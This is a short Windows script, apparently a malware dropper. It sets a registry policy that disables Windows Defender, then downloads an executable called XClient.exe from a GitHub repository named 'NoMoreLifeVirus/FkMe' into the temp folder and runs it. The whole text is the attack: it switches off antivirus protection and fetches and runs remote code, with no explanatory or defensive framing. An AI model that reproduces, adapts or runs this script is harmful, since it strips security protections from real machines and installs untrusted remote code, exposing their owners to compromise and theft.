reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f

$url = "https://github.com/NoMoreLifeVirus/FkMe/raw/refs/heads/main/XClient.exe"
$output = "$env:TEMP\XClient.exe"
Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output -Wait
